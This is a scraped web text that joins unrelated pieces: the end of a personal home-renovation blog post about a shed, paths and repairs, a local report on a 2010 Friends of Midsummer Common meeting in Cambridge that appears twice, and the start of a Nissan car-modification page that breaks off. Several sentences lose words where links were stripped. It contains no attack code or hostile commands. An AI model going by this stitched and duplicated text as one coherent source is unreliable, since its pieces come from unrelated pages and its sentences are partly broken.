weatherboards and doors and replace them with new ones, before repainting the whole shed.</p>   <div>    <p>A small 1meter retaining wall would have been more than enough to protect the shed, but instead the earth has ended up piled around it causing it to rot and collapse.</p>   </div>   <p>&#xa0;</p>   <p>I also had help from dad and toppled the mid-size trees that were in-between the shed and the path. Not only were they blocking out light, but they were also going to be a clear issue to shed and path integrity in the future as they got bigger.</p>   <div>    <p>Much tidier! Just need to fix the shed itself now&#x2026;</p>   </div>   <p>I&#x2019;m still really keen to get this shed fixed so intend to make a start on measuring and sourcing the timber soon(ish) and maybe taking a few days off work to line up a block of time to really attack and fix it up.</p>   <p>&#xa0;</p>   <p>A more pressing issue has been our pathways. We have two long 30-40meter concrete paths, a long ramped one (around 20-30 degree slope) up to the upper street and carpad and another zig-zag path with a mix of ramps and steps heading down to the lower street where the bus stop is.</p>   <p>Both paths are not in the best condition. The lower one requires a complete replacement, it&#x2019;s probably around 80 years old and the non-reinforced concrete has cracked and shifted all over the place.</p>   <p>The upper one is more structurally intact, but has it&#x2019;s own share of issues. The first most serious issue is that the steeper upmost end gets&#xa0;incredibly slippery in winter. It seems that although the concrete has been brush-finished whenever it rains, any grip it had just vanishes and it basically becomes a slide.</p>   <div>    <p>Jethro vs Autumn</p>   </div>   <p>Naturally slipping to a broken/leg/face/life isn&#x2019;t ideal and we&#x2019;ve been looking at options to fix it. We could convert the steepest bit from a ramp to steps, but steps have their own safety issues and we aren&#x2019;t keen the lose the ramp as it&#x2019;s the best way for getting large/heavy items to/from the house.</p>   <p>So a couple months ago I put down some which is a tough non-slippery paint product that basically includes a whole heap of sand which turns the smooth concrete path into something more like fine&#xa0;sandpaper.</p>   <p>We weren&#x2019;t too sure about how good it would be, so we put down a 0.5l strip to test it out on the worst most part of the path.</p>   <div>    <p>A/B Testing IRL</p>   </div>   <p>It doesn&#x2019;t feel that different to brushed concrete in the dry, but in the wet the difference is night &amp; day and you really do feel a bit more attached to the path. We&#x2019;ll still need to invest in a decent handrail and fence, but this goes a long way towards an elegant fix.</p>   <p>I&#x2019;ve since brought another 10l and painted the upper portion, essentially all the &#x201c;good&#x201d; concrete we have. I thought that it might be too dark but actually it looks very sharp and once we put a new fence up (maybe white picket?) it will look very clean and tidy.</p>   <div>    <p>Old concrete, as good as new! :-)</p>   </div>   <p>The other ~30meters down to the house isn&#x2019;t in such good shape, the surface is quite uneven in places and it&#x2019;s missing chunks. We have a project to do to repair or replace the rest of it, once done the intention will be to paint the rest of the path in the same colour&#xa0;and it should look and feel great.</p>   <p>&#xa0;</p>   <p>All this work requires a fair few tools, I&#x2019;ve finally clean up the dining room where they had been accumulating and they&#x2019;re now living properly in the shed.</p>   <div>    <p>Shed</p>   </div>   <p>One of the most interesting lessons I&#x2019;ve had so far is that buying decent tools is often far cheaper than hiring tradies to do something for you &#x2013; generally tools are cheap, even decent ones, but labour is incredibly expensive.</p>   <div>    <p>Why yes, that is a hardwood lamppost that I&#x2019;m chainsawing.</p>   </div>   <p>The same thing applies to parts, it&#x2019;s generally cheaper to just buy a new replacement of something than it is to fix it &#x2013; I&#x2019;m used to this from the IT world, but didn&#x2019;t expect it from IRL.</p>   <p>In our cases, we had a shower mixer that decided to start letting a constant small stream of water through rather than shutting off properly.</p>   <div>    <p>Jethro vs Shower</p>   </div>   <p>Taking it apart and even removing it from the wall entirely isn&#x2019;t too tricky, but I found after removing it all that the issue wasn&#x2019;t anything trivial like needing a new o-ring and had to call out the plumbers.</p>   <p>Plumbers took it out, look at and it and are all &#x201c;yeah that needs a new part&#x201d;, so I ended up paying for the part  the labour &#x2013; I&#x2019;d have been better off just buying the whole new part myself and fitting it rather than trying to fix it.</p>   <p>&#xa0;</p>   <p>Never underestimate the amount of waste you produce moving into a new place. I filled a skip with 1/3 concrete rubble, 1/3 polystyrene and 1/3 misc waste and there&#x2019;s still another skip worth of debris around the property, possibly more once I tear all the rotten timber out of the shed.</p>   <p>Polystyrene is my number one enemy right now, almost everything we had shipped to the house when we moved in came with some and it&#x2019;s crumbly and completely non-recyclable for good measure &gt;:-(.</p>   <div>    <p>Where did all this junk come from?</p>   </div>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>Finally on the inside of the house things haven&#x2019;t progressed much.&#xa0;Lisa has been working on the and &#xa0;whilst I&#x2019;ve done exciting things like overseeing the installation of insulation and fixing the loo in the laundry. :-/</p>   <div>    <p>Warming sheep fluff!</p>   </div>   <div>    <p>I hate plumbing!</p>   </div>   <p>I also had a whole bunch of fun with the locks &#x2013; when we moved in I had the locksmith change the tumblers, but we&#x2019;ve since found the locks were pretty worn out and the tail pieces inside started failing, so I had to buy whole new locks and fit them.</p>   <p>Turns out, whole new locks is way cheaper than getting the locksmith out to change the tumblers. If you&#x2019;re moving into an older place, I&#x2019;d recommend consider just getting new locks instead since the old ones probably aren&#x2019;t much good either.</p>   <p>The only downside is that the sizing was slightly different, so I had to do some &#x201c;creative woodwork&#x201d; using a drill bit as a file (I didn&#x2019;t have a file&#x2026;. or the right size drill bit. A bit dodgy, but worked out OK).</p>   <div>    <p>It&#x2019;s not just the IT world where the lack of standards means a bit of hackery to make stuff function.</p>   </div>   <div>    <p>Tidy job at the end of the day!</p>   </div>   <p>&#xa0;</p>   <p>A lot of this work has been annoying in that it&#x2019;s not directly visible as an improvement, but it&#x2019;s all been important stuff that needed doing. I&#x2019;m hoping to spend the next few months getting stuck into some of the bigger improvements like fixing the paths, sheds, etc which will be a lot more visible.</p>   <p>Until then, need to make more evenings to just sit back, relax and enjoy having our own place &#x2013; feels like I&#x2019;ve been just far too busy lately.</p>   <div>    <p>Beer time</p>   </div>  </div>  
    </div>   </div>   <p>Dick Baxter, the chair of the Friends of Midsummer Common addressed the meeting. He said that last year his report had been damming, particularly of the council. He said &#x201c;That&#x2019;s history&#x201d; and reported that things had been better in 2009 and the common was in much better shape than it had been a year ago. He said he had spent a lot of time moaning at council staff and councillors but said: &#x201c;it works&#x201d;. He reported that seven diseased and dangerous trees and been cut down; he said the council had been erring on the side of caution but said he and the Friends of Midsummer Common were &#x201c;not happy but had been persuaded&#x201d; the council was doing the right thing. Mr Baxter reported he had spoken in favour of the tree felling at the planning meeting (which had advised Cllr Smith to let order the fellings). My . </p>   <p>Mr Baxter spoke scathingly about the fact that while councillors had promised to replace the trees which they had cut down this hasn&#x2019;t happened. He said he, and the friends were upset that they had not gone back and described this as the bad news of the year. </p>   <p>Turning to the cattle he said they were technically &#x201c;steers&#x201d; now cows (and certainly during the year &#x2013; bulls!). </p>   <p>Mr Baxter spoke about his efforts to get the lighting on the footpath reinstated saying it was difficult to deal with the councils when they insisted the lights were on but he was looking at them and they were not. </p>   <p>The railings all round the common had been painted in the last year, courtesy of, in Mr Baxter&#x2019;s words: &#x201c;The ASBO people&#x201d;. </p>   <p>On the 2009 Strawberry Fair Mr Baxter said that all parties had put lots of effort into improvements and it had been much better than previous years, he said that fencing off the &#x201c;neighbourhood area&#x201d; had been the major contribution.</p>   <p>The Friends of Midsummer Common had engaged with consultation on redevelopment of the Regional College Site, which overlooks the common, though Mr Baxter said he was surprised to see the developers cite the Friends as supporters of the application in the planning application. He said there would be a visual impact, but noted what was there before wasn&#x2019;t particularly great visually. He said there had been discussions relating to control of access to the common from the site. He said he was currently reviewing the paperwork relating to S.106 contributions from the site but said: &#x201c;what they could have done for the common has got lost&#x201d; and the funding had been &#x201c;diverted to other areas&#x201d; despite this he said he hoped there was still &#x201c;room for some argument&#x201d;. In response to a query from a member of the public Mr Baxter said the new development would be 4-5 stories. </p>   <h3>Cllr Julie Smith &#x2013; Executive Councillor for Green Spaces, Arts and Recreation (Liberal Democrat)</h3>   <p>Cllr Smith addressed the meeting. She said that some of the matters raised did not come under her portfolio, or those of the &#x201c;active communities&#x201d; council officers present. On the dispersal orders she said that was &#x201c;ultimately the decision of the leader of the council&#x201d;, though she said her view was that changing the dispersal zones was &#x201c;not the first solution&#x201d; to problems with drink and drugs. On litter again, despite being in charge of the city&#x2019;s green spaces she gave the impression there was little that she directly could do, she said: &#x201c;I can try and persuade &#x2018;Streetscene&#x2019; (a council department) that there is a problem&#x201d;. </p>   <p>Cllr Smith didn&#x2019;t try and deny responsibility for lack of a strategy for new tree planting and not replacing the felled trees; she said: &#x201c;I feel at least as frustrated as anyone else as I made a commitment last year&#x201d;. She said she had spoken to John Preston, who she described as the boss of the council&#x2019;s chief tree officer Diana Oviat -Hamm. She said a view had been taken that it was not appropriate to replace trees like for like in advance of deciding on a planting scheme. Cllr Smith came up with a vague date of &#x201c;late June / July&#x201d; for a meeting outside on the common to talk about the possibilities. She said there was time then following that meeting for proposals to be drawn up and planted in the winter of 10/11. </p>   <p>On Strawberry Fair Cllr Smith said that the City Council has a licence for Midsummer Common but this year the licensees &#x2013; council officers &#x2013; had decided not to allow the fair to use the council licence requiring it to apply to the council for a new one. She reported that the police opposed the application for a new licence, on the grounds that all four licensing objectives were being breeched and that the police had appealed to magistrates when councillors made the decision to approve the new licence. Cllr Smith said that permission to use the common had been given by the council whereas council officer Mr Wilson said no request from the fair to use the common had been received this year. Mr Wilson said that the expected date for magistrates determining the appeal was just one week before the proposed date of the fair. </p>   <h3>Community Orchard</h3>   <p>Mr Baxter reported that his had come out of the management plan. He reported he had been &#x201c;sent to Belgium&#x201d; to be trained on orchards (I think the suggestion may have been he&#x2019;d needed training by the European Union before being allowed to plant some fruit trees). He told the meeting the most interesting snippet from his training was learning about one Belgian man who&#x2019;d grafted 300 species of apple onto one apple tree. He&#x2019;d been meeting with other orchard experts too and said he&#x2019;d found out after all this effort that the biggest issue in orchard planting was if trees ought be placed in a square or round hole. He related that there is a school of thought which says roots can get funnelled to the corners of square holes. In light of this unsolved questions the new Midsummer Common orchard would be planted with half the trees in round holes and half in square ones. </p>   <p>All the trees to be planted are genuinely local species, all from Cambridgeshire. The first tranche of trees will be fifteen apple and four crab-apples. He warned that at first the trees would appear like walking sticks in the ground. He said that despite this an apple chutney group had been formed in anticipation of the first harvest. </p>   <p>Next year plums, gages, and pears are to be planted. Cambridge is supposedly famous for its gages, and the pears are to be .</p>   <p>The orchard is on the area of the common next to the allotments; its the raised area higher than the rest of the common on which the cows used to be placed for a few days during events. </p>   <h3>Cows &#x2013; Angelika von Heimendahl</h3>   <div>    <div>     While this cow has been eaten and this tree felled; Midsummer Common will be seeing new trees and new cows soon.    </div>   </div>   <p> Angelika von Heimendahl spoke to the meeting. She said she had applied to the council to graze 35 cows on the city&#x2019;s commons later this year; 8-10 of which would be on Midsummer Common. She said the meat would be available for sale at local butchers and via a stall on the market. The cows which are to go onto Midsummer Common spent last year on Grantchester meadows where 40 young cows had been for 2009. The meeting was told that on Grantchester meadows better suited the younger cows as they were let out once then brought back in at the end of the season. von Heimendahl told the meeting she has 70 cows, all red polls, in total. </p>   <p>von Heimendahl also told the meeting that a ramp in the river, by Victoria Avenue bridge, is to be installed soon to help the cows out when they end up in the river. (This is something , before the cows were re-introduced to the common as the previous ramp, by the cutter ferry bridge, had deteriorated. von Heimendahl said she appreciated the ramp would need maintenance, perhaps annually. Personally I think having the ramp upstream is rather crazy as it will be harder to coax a cow upsteam than down &#x2013; particularly if there is a fast stream on the river. </p>   <p>When asked why it took so long for the cows to be returned after events von Heimendahl said there was almost no grass left after the Strawberry Fair. She said that now the area on the other side of the cutter ferry bridge has been made accessible to the cows they will be able to stay there for longer. It was explained that the cows were solely grass fed (for flavour and texture) and as beef cattle they have to be fattened up and there needs to be a good amount of grass for them to eat. The pound area can only sustain the cows for three days; access to the area on the other side of the cutter ferry bridge means the cows can more easily be kept close to the common for longer. </p>   <p>Mr Baxter related a funny story about how on the day of the Strawberry Fair the cows were still out on the common. Having called but not got a response he and Barry Higgs and gone out and herded the cows together and began walking them towards the pound. On the way they started to run and Mr Baxter and Mr Biggs struggled to keep up, they were rather baffled until they arrived in the pound to see Angelika von Heimendahl shaking a bucket of feed and were told that all their efforts herding the cows hadn&#x2019;t been necessary as all she had to do was shake her bucket and they&#x2019;d come running from anywhere on the common. </p>   <h3>Horse Chestnut Avenue</h3>   <p>When asked about the health of these trees Mr Wilson said that most of the trees were affected by both the leaf moth and now bleeding canker. He said there was only &#x201c;a year or two before the end of these&#x201d;. </p>   <p>Commenting on locations for new planting he said there were already objections from those living on North Terrace to trees being planted in-front of their homes. He pointed to the large sum of money the council was making available for the replanting and said schemes of the scale seen in the 1890s &#x2013; when the existing avenues were planted were possible. </p>   <h3>The Gate on the Path to the Pub/Restaurant</h3>   <p>A member of the public suggested the solutions to the problem were &#x201c;not rocket science&#x201d;. Cllr Bick said the reason he had not made good on his election pledge to get an electric gate installed was that the Friends of Midsummer Common had not supported a scheme. Mr Baxter said this was because no suitably robust and suitably priced scheme had been proposed. It was reported that EDF electricity had quoted &#xa3;20,000 for installing an electricity supply to the site. A member of the public asked why it could not be powered from nearby street lamps. </p>   <p>Andy Rankin, who lives on a boat on the common and runs had been elected to one of the vacant spots on the Friends of Midsummer Common Committee. He said that he thought solar power would be an option for powering the gate. He offered to &#x201c;do the sums&#x201d; and council officers indicted they would be keen to talk to him; Cllr Smith expressed support for the idea as a &#x201c;green&#x201d; solution. </p>   <p>One person, Wendy Andrews, spoke against any strengthening of the grass () saying that this would be the start of a slippery slope to permitting parking on the common. </p>   <p>One person suggest council vehicles were also a problem, though this was not a generally supported view as the problem is concentrated near the pub/restaurant. A suggestion that a maximum size of vehicle allowed on the common ought be introduced as delivery lorries, particularly a regular delivery vehicle from , were considered too big. A suggestion of reminding all taxi companies again that they ought not drive on the common, unless for a disabled passenger, was made. </p>   <h3>Bus Parking</h3>   <p>Finally someone raised the bus parking on Victoria Avenue, saying more buses were parking there for longer periods and detracting from the visual appearance of the area. Liberal Democrat County Councillor Sarah Whitebread appeared to agree this was a problem and said she would take it up.</p>   <p> <i>Cllrs Whitebread, Bick and Smith were present. Cllrs Rosenstiel and Dixon sent their apologies. Mr Baxter declared his interest in the common &#x2013; it is his front garden, the front door of his house opens onto it. </i></p>   <h3>See Also</h3>   <ul>    <li> &#x2013; lots of photographs of the trees lost in the last year.</li>   </ul>  </div>  
   <div>   <div>    <div>     Midsummer Common &#x2013; Cambridge    </div>   </div>   <p>On the 17<sup>th</sup> of March 2010 I and about thirty others attended an annual general meeting of the Friends of Midsummer Common. This was a meeting, open to all, which had been advertised on the common.</p>   <h3>Interesting Points</h3>   <ul>    <li>Council officer Alistair Wilson reported that the Horse Chestnuts on Victoria avenue have only a year or two left [before the council will be seeking to fell them].</li>    <li>Planting a new orchard began on the 19th and 20th of March; local trees are being used and in a typically Cambridge fashion an experiment is being run to see if trees planted in round or square holes fare best. Also an apple chutney group has been established despite a first harvest not being expected for a few years. </li>    <li>Trees recently felled on the common have not been replaced despite assurances from Cllr Julie Smith and other councillors. Cllr Smith says there is time to come up with a plan during summer 2010 for new strategic planting in winter 2010/11. Cllr Smith had planned, and promised, be in a position to replant during 09/10 planting season but failed. We need to be as visionary and forward thinking as those who planted the existing avenue on Victoria Avenue and the plane tree avenue on Jesus Green. </li>    <li>Cllr Smith revealed that the reason the, needed to apply for its own licence at all was because the City Council had refused it permission to use the council&#x2019;s, existing, licence for the common. Council officers reported it was expected that magistrates would have only decided the police&#x2019;s appeal against the new licence being granted. </li>    <li>The Chair of the Friends of Midsummer Common, Mr Baxter, reported the City Council had given him a litter picker. He has also been on a number of orchard planting courses, including one in Belgium, though who funded those wasn&#x2019;t revealed. </li>    <li>Those serving community service sentences by working on the common can&#x2019;t be asked to pick litter as there is no &#x201c;skills development&#x201d; involved in that task; they have however been used to paint all the railings in the last year.</li>   </ul>   <h3>City Council Officers&#x2019; Presentation</h3>   <p>The meeting started with a presentation by two city council officers, Sarah Tovell and Alistair Wilson, members of the &#x201c;active communities&#x201d; team. Sarah Tovell said her role was &#x201c;development&#x201d; of open space; Mr Wilson introduced himself as the &#x201c;Green Spaces Manager&#x201d; saying he was responsible for &#x201c;strategy and development&#x201d;. </p>   <p>They said that three meadows had been sown on the common in an attempt to increase species diversity and claimed to be &#x201c;committed to replanting trees&#x201d;. They also told the meeting they wanted to &#x201c;make the invisible visible and explain why they cut the grass and why meadows had been planted. The fact that the first of the trees in the new Orchard were due to be planted on the coming weekend was mentioned. </p>   <h3>Questions to Council Officers</h3>   <h4>Drinking and Dispersal onto the Common</h4>   <p>Public questions to the council officers followed their presentation. The first asked what was being done about an increase in &#x201c;street people drinking on the common&#x201d;, the person raising the point said &#x201c;it doesn&#x2019;t enhance the environment&#x201d;. They pointed out that common now forms the boundary of the current dispersal zone (). The questioner said they had contacted the police but had been told by them that it was a question for the city council. </p>   <p>Responding; council officer Mr Wilson said he would pass the comment on to the council&#x2019;s Anti-Social Behaviour team and asked if it would help if benches were removed. </p>   <h4>Vandalism of the Orchard</h4>   <p>The next question asked how vandalism can be prevented at the new orchard and what can be done to stop the area becoming a haven for drug dealing and drug taking. Mr Wilson replied to say he hoped that &#x201c;natural surveillance&#x201d; from overlooking properties would help. </p>   <h4>Litter</h4>   <p>A member of the public then asked about rubbish in bushes, some of which he said had been left uncleared for six or seven months. The chairman of the Friends of Midsummer Common reported that Cambridge City Council had given him a litter grabber which he uses to pick litter. The questioner wasn&#x2019;t clear about exactly where the rubbish he was talking about was. </p>   <p>It was asked why those doing community service, who&#x2019;re often seen sitting on the common in their orange jackets with &#x201c;community payback&#x201d; written on the back, couldn&#x2019;t pick litter. Council officer Mr Wilson reported that projects for them to do had to involve some element of &#x201c;skills development&#x201d; and while painting does, litter picking does not. A freedom of information request I made for revealed that &#x201c;clearing and tidying&#x201d; is considered a valid use of their time. Personally I think it would be fantastic if those on community sentences could be joined by members of the Friends of Midsummer Common and other volunteers I expect in Cambridge they&#x2019;d probably be oversubscribed with those eager to help.</p>   <h4>Path to Pub/Restaurant</h4>   <p>The state of the path between Victoria Avenue and the Pub/Restaurant was raised next, with driving and turning on the grass resulting in lots of mud being the problem. This question was addressed later in the meeting. </p>   <h4>Mowing Timetable</h4>   <p>A member of the public asked if the timetable for mowing could be published; and if mowing could take place other than just to get the common ready for fairs. Mr Baxter suggested that mowing ought be timed to cut down weeds rather than being in advance of events, but he also said that ideally we want the cattle to eat the grass and weeds not mow.</p>   <h4>Litter</h4>   <p>Andy Rankin reported that the Camboaters were not organising a Cam Cleanup this year, but said he thought that if the Friends of Midsummer Common organised something it would be supported by boaters. </p>   <h4>Mooring Rings</h4>   <p>While he was speaking Mr Rankin also asked about the cast iron mooring rings which have been taken away from the common. Mr Wilson said he had the mooring rings, and was using one as a door-stop in his city council office. He said there was an intent to have them all re-blasted and refitted to the mooring bollards proposed. (See my article: )</p>   <h4>Noticeboard and Cllr Bick&#x2019;s Election Commitments</h4>   <p>A noticeboard was suggested by a member of the public; one reason given was that those trying to stop people lighting fires and damaging the grass by having BBQs have nothing to point to to show that such behaviour is not permitted. </p>   <p>The discussion on noticeboards resulted in Mr Baxter asking if this was something which Cllr Bick, who was present, had promised as part of his personal election manifesto, along with an electric gate which would control vehicular access to the common. Cllr Bick responded to say it was something which could be discussed at a meeting to be held the next day within the council to follow up the friends&#x2019; meeting. Mr Baxter said to Cllrs Bick and Smith: &#x201c;Surely the council does what you suggest&#x201d;, to which Bick said &#x201c;If only&#x201d; and Cllr Smith shrugged. This lack of a grip on power is in my view a real problem with the local Liberal Democrats. The question of the gate was returned to later. </p>   <p>While I think that the internal council meeting with respect to Midsummer Common appears to be being used much more reasonably than the Jesus Green stakeholder meeting has been I think both ought have their attendees, minutes and agendas published and ought be open to the public. </p>   <h3>Chairman&#x2019;s Report</h3>   <div>    <div>     Friends of Midsummer Common Chairman Dick Baxter (left) and secretary Barry Higgs (right) lead the public AGM on the 17th of March 2010.    </div>   </div>   <p>Dick Baxter, the chair of the Friends of Midsummer Common addressed the meeting. He said that last year his report had been damming, particularly of the council. He said &#x201c;That&#x2019;s history&#x201d; and reported that things had been better in 2009 and the common was in much better shape than it had been a year ago. He said he had spent a lot of time moaning at council staff and councillors but said: &#x201c;it works&#x201d;. He reported that seven diseased and dangerous trees and been cut down; he said the council had been erring on the side of caution but said he and the Friends of Midsummer Common were &#x201c;not happy but had been persuaded&#x201d; the council was doing the right thing. Mr Baxter reported he had spoken in favour of the tree felling at the planning meeting (which had advised Cllr Smith to let order the fellings). My . </p>   <p>Mr Baxter spoke scathingly about the fact that while councillors had promised to replace the trees which they had cut down this hasn&#x2019;t happened. He said he, and the friends were upset that they had not gone back and described this as the bad news of the year. </p>   <p>Turning to the cattle he said they were technically &#x201c;steers&#x201d; now cows (and certainly during the year &#x2013; bulls!). </p>   <p>Mr Baxter spoke about his efforts to get the lighting on the footpath reinstated saying it was difficult to deal with the councils when they insisted the lights were on but he was looking at them and they were not. </p>   <p>The railings all round the common had been painted in the last year, courtesy of, in Mr Baxter&#x2019;s words: &#x201c;The ASBO people&#x201d;. </p>   <p>On the 2009 Strawberry Fair Mr Baxter said that all parties had put lots of effort into improvements and it had been much better than previous years, he said that fencing off the &#x201c;neighbourhood area&#x201d; had been the major contribution.</p>   <p>The Friends of Midsummer Common had engaged with consultation on redevelopment of the Regional College Site, which overlooks the common, though Mr Baxter said he was surprised to see the developers cite the Friends as supporters of the application in the planning application. He said there would be a visual impact, but noted what was there before wasn&#x2019;t particularly great visually. He said there had been discussions relating to control of access to the common from the site. He said he was currently reviewing the paperwork relating to S.106 contributions from the site but said: &#x201c;what they could have done for the common has got lost&#x201d; and the funding had been &#x201c;diverted to other areas&#x201d; despite this he said he hoped there was still &#x201c;room for some argument&#x201d;. In response to a query from a member of the public Mr Baxter said the new development would be 4-5 stories. </p>   <h3>Cllr Julie Smith &#x2013; Executive Councillor for Green Spaces, Arts and Recreation (Liberal Democrat)</h3>   <p>Cllr Smith addressed the meeting. She said that some of the matters raised did not come under her portfolio, or those of the &#x201c;active communities&#x201d; council officers present. On the dispersal orders she said that was &#x201c;ultimately the decision of the leader of the council&#x201d;, though she said her view was that changing the dispersal zones was &#x201c;not the first solution&#x201d; to problems with drink and drugs. On litter again, despite being in charge of the city&#x2019;s green spaces she gave the impression there was little that she directly could do, she said: &#x201c;I can try and persuade &#x2018;Streetscene&#x2019; (a council department) that there is a problem&#x201d;. </p>   <p>Cllr Smith didn&#x2019;t try and deny responsibility for lack of a strategy for new tree planting and not replacing the felled trees; she said: &#x201c;I feel at least as frustrated as anyone else as I made a commitment last year&#x201d;. She said she had spoken to John Preston, who she described as the boss of the council&#x2019;s chief tree officer Diana Oviat -Hamm. She said a view had been taken that it was not appropriate to replace trees like for like in advance of deciding on a planting scheme. Cllr Smith came up with a vague date of &#x201c;late June / July&#x201d; for a meeting outside on the common to talk about the possibilities. She said there was time then following that meeting for proposals to be drawn up and planted in the winter of 10/11. </p>   <p>On Strawberry Fair Cllr Smith said that the City Council has a licence for Midsummer Common but this year the licensees &#x2013; council officers &#x2013; had decided not to allow the fair to use the council licence requiring it to apply to the council for a new one. She reported that the police opposed the application for a new licence, on the grounds that all four licensing objectives were being breeched and that the police had appealed to magistrates when councillors made the decision to approve the new licence. Cllr Smith said that permission to use the common had been given by the council whereas council officer Mr Wilson said no request from the fair to use the common had been received this year. Mr Wilson said that the expected date for magistrates determining the appeal was just one week before the proposed date of the fair. </p>   <h3>Community Orchard</h3>   <p>Mr Baxter reported that his had come out of the management plan. He reported he had been &#x201c;sent to Belgium&#x201d; to be trained on orchards (I think the suggestion may have been he&#x2019;d needed training by the European Union before being allowed to plant some fruit trees). He told the meeting the most interesting snippet from his training was learning about one Belgian man who&#x2019;d grafted 300 species of apple onto one apple tree. He&#x2019;d been meeting with other orchard experts too and said he&#x2019;d found out after all this effort that the biggest issue in orchard planting was if trees ought be placed in a square or round hole. He related that there is a school of thought which says roots can get funnelled to the corners of square holes. In light of this unsolved questions the new Midsummer Common orchard would be planted with half the trees in round holes and half in square ones. </p>   <p>All the trees to be planted are genuinely local species, all from Cambridgeshire. The first tranche of trees will be fifteen apple and four crab-apples. He warned that at first the trees would appear like walking sticks in the ground. He said that despite this an apple chutney group had been formed in anticipation of the first harvest. </p>   <p>Next year plums, gages, and pears are to be planted. Cambridge is supposedly famous for its gages, and the pears are to be .</p>   <p>The orchard is on the area of the common next to the allotments; its the raised area higher than the rest of the common on which the cows used to be placed for a few days during events. </p>   <h3>Cows &#x2013; Angelika von Heimendahl</h3>   <div>    <div>     While this cow has been eaten and this tree felled; Midsummer Common will be seeing new trees and new cows soon.    </div>   </div>   <p> Angelika von Heimendahl spoke to the meeting. She said she had applied to the council to graze 35 cows on the city&#x2019;s commons later this year; 8-10 of which would be on Midsummer Common. She said the meat would be available for sale at local butchers and via a stall on the market. The cows which are to go onto Midsummer Common spent last year on Grantchester meadows where 40 young cows had been for 2009. The meeting was told that on Grantchester meadows better suited the younger cows as they were let out once then brought back in at the end of the season. von Heimendahl told the meeting she has 70 cows, all red polls, in total. </p>   <p>von Heimendahl also told the meeting that a ramp in the river, by Victoria Avenue bridge, is to be installed soon to help the cows out when they end up in the river. (This is something , before the cows were re-introduced to the common as the previous ramp, by the cutter ferry bridge, had deteriorated. von Heimendahl said she appreciated the ramp would need maintenance, perhaps annually. Personally I think having the ramp upstream is rather crazy as it will be harder to coax a cow upsteam than down &#x2013; particularly if there is a fast stream on the river. </p>   <p>When asked why it took so long for the cows to be returned after events von Heimendahl said there was almost no grass left after the Strawberry Fair. She said that now the area on the other side of the cutter ferry bridge has been made accessible to the cows they will be able to stay there for longer. It was explained that the cows were solely grass fed (for flavour and texture) and as beef cattle they have to be fattened up and there needs to be a good amount of grass for them to eat. The pound area can only sustain the cows for three days; access to the area on the other side of the cutter ferry bridge means the cows can more easily be kept close to the common for longer. </p>   <p>Mr Baxter related a funny story about how on the day of the Strawberry Fair the cows were still out on the common. Having called but not got a response he and Barry Higgs and gone out and herded the cows together and began walking them towards the pound. On the way they started to run and Mr Baxter and Mr Biggs struggled to keep up, they were rather baffled until they arrived in the pound to see Angelika von Heimendahl shaking a bucket of feed and were told that all their efforts herding the cows hadn&#x2019;t been necessary as all she had to do was shake her bucket and they&#x2019;d come running from anywhere on the common. </p>   <h3>Horse Chestnut Avenue</h3>   <p>When asked about the health of these trees Mr Wilson said that most of the trees were affected by both the leaf moth and now bleeding canker. He said there was only &#x201c;a year or two before the end of these&#x201d;. </p>   <p>Commenting on locations for new planting he said there were already objections from those living on North Terrace to trees being planted in-front of their homes. He pointed to the large sum of money the council was making available for the replanting and said schemes of the scale seen in the 1890s &#x2013; when the existing avenues were planted were possible. </p>   <h3>The Gate on the Path to the Pub/Restaurant</h3>   <p>A member of the public suggested the solutions to the problem were &#x201c;not rocket science&#x201d;. Cllr Bick said the reason he had not made good on his election pledge to get an electric gate installed was that the Friends of Midsummer Common had not supported a scheme. Mr Baxter said this was because no suitably robust and suitably priced scheme had been proposed. It was reported that EDF electricity had quoted &#xa3;20,000 for installing an electricity supply to the site. A member of the public asked why it could not be powered from nearby street lamps. </p>   <p>Andy Rankin, who lives on a boat on the common and runs had been elected to one of the vacant spots on the Friends of Midsummer Common Committee. He said that he thought solar power would be an option for powering the gate. He offered to &#x201c;do the sums&#x201d; and council officers indicted they would be keen to talk to him; Cllr Smith expressed support for the idea as a &#x201c;green&#x201d; solution. </p>   <p>One person, Wendy Andrews, spoke against any strengthening of the grass () saying that this would be the start of a slippery slope to permitting parking on the common. </p>   <p>One person suggest council vehicles were also a problem, though this was not a generally supported view as the problem is concentrated near the pub/restaurant. A suggestion that a maximum size of vehicle allowed on the common ought be introduced as delivery lorries, particularly a regular delivery vehicle from , were considered too big. A suggestion of reminding all taxi companies again that they ought not drive on the common, unless for a disabled passenger, was made. </p>   <h3>Bus Parking</h3>   <p>Finally someone raised the bus parking on Victoria Avenue, saying more buses were parking there for longer periods and detracting from the visual appearance of the area. Liberal Democrat County Councillor Sarah Whitebread appeared to agree this was a problem and said she would take it up.</p>   <p> <i>Cllrs Whitebread, Bick and Smith were present. Cllrs Rosenstiel and Dixon sent their apologies. Mr Baxter declared his interest in the common &#x2013; it is his front garden, the front door of his house opens onto it. </i></p>   <h3>See Also</h3>   <ul>    <li> &#x2013; lots of photographs of the trees lost in the last year.</li>   </ul>  </div>  
   <div>   <div>    <h1>Classic Nissan</h1>   </div>   <div>    <p>The rear wheel drive Nissans are absolute classics in their own right, and a gold-mine for anyone wanting to build a fast, reliable, good-handling car, either for road, track or drifting. </p>    <div>     <p>Nissan RB25DET</p>    </div>    <div>     <p>Nissan SR20DET</p>    </div>    <p>There are the six cylinder cars- Skyline, Laurel and Cefiro, and the four cylinder cars &#x2013; Sylvia, 200SX, 180 SX, all available with and without turbo. The sixes (the RB&#x2019;s) come on 2 litre 2.5 litre, 2.6 litre (the Godzilla) and 3 litre (Aussie Nissans and Holdens) It is possible to build a RB30DET by taking an aussie 3 litre block and fitting an RB25DET head. It is common to fir bigger turbos, and some phenomenal power outputs can be achieved. The fours (SR&#x2019;s) are no slouches either- conversions of a DE to a DET by fitting a turbo are common, as is fitting bigger turbos.</p>    <p>The suspensions on all of these cars is basically sound from the get-go, and respond well to fitment of adjustable platform struts (coil-overs), adjustable camber arms, caster bars, etc.</p>    <p>The braking systems can generally be interchanged- the bigger brakes come with 5 stud hubs.</p>    <p>Front Intercoolers are commonly fitted, and often holes cut in the inner guards for Intercooler ducts. There is a problem with later, &#x201c;frontal impact&#x201d; cars- no LVV Certifier can test the crash performance of a car, so cannot approve anything that affects frontal impact. We heard of a man who bought an intercooler kit from Japan, and followed the instructions to modify the front siderails to make it fit. He ended up having to have the whole front of his car re-built with new side-rails. If your car is fitted with airbags, or is later than about 1997, check FIRST with your LVV Certifier</p>    <p><strong>John Brett Technology Ltd.

